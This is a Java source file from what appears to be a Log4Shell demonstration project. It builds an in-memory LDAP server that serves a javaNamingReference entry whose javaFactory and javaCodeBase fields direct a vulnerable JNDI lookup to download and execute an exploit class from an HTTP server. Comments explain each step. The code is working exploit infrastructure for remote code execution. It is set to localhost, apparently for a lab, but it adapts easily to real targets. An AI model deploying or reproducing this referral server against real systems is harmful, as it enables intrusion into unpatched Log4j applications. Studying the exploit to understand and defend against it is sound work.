package io.github.hurynovich.log4shell.environment;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldif.LDIFException;

public class LdapServerSetup {
    private final int ldapPort;
    private final int httpPort;
    private final Class<?> exploit;
    private final InMemoryDirectoryServer ldapSrv;

    public LdapServerSetup(int ldapPort, int httpPort, Class<?> exploitClass) {
        this.ldapPort = ldapPort;
        this.httpPort = httpPort;
        this.exploit = exploitClass;

        try {
            ldapSrv = configureServer();
        } catch (Exception e) {
            throw new Error("Failed to configure LDAP server.", e);
        }
    }

    private InMemoryDirectoryServer configureServer() throws LDAPException, LDIFException {
        InMemoryDirectoryServerConfig cfg = new InMemoryDirectoryServerConfig ("cn=exploit");
        cfg.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("default", ldapPort));

        // remove default schema definition to disable all constrains
        // so it is possible to store simplified entry (entity) which doesn't follow specification
        cfg.setSchema(null);
        InMemoryDirectoryServer result = new InMemoryDirectoryServer(cfg);

        //URL where bytecode is placed. Any path can be used, I used <class name>.class.
        String bytecodeUrl = "http://localhost:" + httpPort + "/" + exploit.getSimpleName() + ".class";

        // creates (saves) entry in server
        // when such entry read via JNDI it is interpreted as javax.naming.Reference
        // and for old JREs automatically loads and executes remote bytecode referred in this entry
        result.add(
            "dn: cn=exploit",                       // LDAP Entry relative path.
            "objectClass: javaNamingReference",     // LDAP class specified by RFC 2713.
            "javaClassName: java.lang.Object",      // Java class name of referenced instance. It should be local class.
            "javaFactory: " + exploit.getName(),    // Java class name of Factory. And it can be remote which is used to make code injection.
            "javaCodeBase: " + bytecodeUrl  // URL where bytecode of Factory class is downloaded.
        );

        return result;
    }

    public void start() {
        try {
            ldapSrv.startListening();
        } catch (LDAPException e) {
            throw new Error("Failed to start LDAP server.", e);
        }
    }

    public void stop() {
        ldapSrv.close();
    }
}
